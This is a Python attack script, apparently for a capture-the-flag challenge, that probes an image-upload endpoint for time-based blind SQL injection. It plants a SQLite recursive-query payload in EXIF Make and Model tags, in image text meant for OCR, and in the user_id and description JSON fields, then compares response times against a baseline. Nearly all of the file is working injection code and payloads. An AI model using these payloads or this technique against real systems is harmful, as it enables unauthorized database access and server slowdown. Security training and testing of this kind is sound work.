# time_blind.py — time-based blind SQLi detection. Everything returns 200 with no visible diff,
# so measure RESPONSE TIME. SQLite has no SLEEP(); force delay with a heavy recursive/CROSS JOIN.
# If a field is injectable, the payload version takes much longer than the baseline.
from PIL import Image
import piexif, base64, requests, time

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
base_img = Image.open("paisaje.png").convert("RGB")

# a SQLite heavy expression that burns CPU (~seconds) if executed
HEAVY = "(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))"

def make_uri(make_val=b"Samsung", model_val=b"Galaxy S25", ocr_text=None):
    img = base_img.copy()
    if ocr_text:
        from PIL import ImageDraw, ImageFont
        d=ImageDraw.Draw(img);
        try: f=ImageFont.truetype("C:/Windows/Fonts/consolab.ttf",30)
        except: f=ImageFont.load_default()
        img=img.resize((1400,300)); d=ImageDraw.Draw(img)
        d.rectangle([0,0,1400,90],fill=(255,255,255)); d.text((20,20),ocr_text,font=f,fill=(0,0,0))
    img.save("tb.jpg","jpeg",quality=80)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:make_val,piexif.ImageIFD.Model:model_val},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"tb.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("tb.jpg","rb").read()).decode()

def timed(uri, desc):
    t=time.time()
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return round(time.time()-t,2), r.status_code

q="'"
# baseline vs payload for each text field, plus body fields
cases = [
    ("baseline_make",   make_uri(make_val=b"Samsung")),
    ("make_heavy",      make_uri(make_val=(q+"||"+HEAVY+"||"+q).encode())),
    ("model_heavy",     make_uri(model_val=(q+"||"+HEAVY+"||"+q).encode())),
    ("ocr_heavy",       make_uri(ocr_text=q+"||"+HEAVY+"||"+q)),
]
print("field           time(s)  status  (payload much slower => injectable)")
for desc, uri in cases:
    dt, sc = timed(uri, "TB_"+desc)
    print(f"{desc:16} {dt:6}   {sc}")

# body fields (user_id, description) timed directly (no image needed beyond a valid one)
valid = make_uri()
for field in ["user_id","description"]:
    body={"image":valid,"description":"x","user_id":UID}
    body[field] = q+"||"+HEAVY+"||"+q
    t=time.time(); r=requests.post(f"{BASE}/upload", json=body); dt=round(time.time()-t,2)
    print(f"{'body_'+field:16} {dt:6}   {r.status_code}")
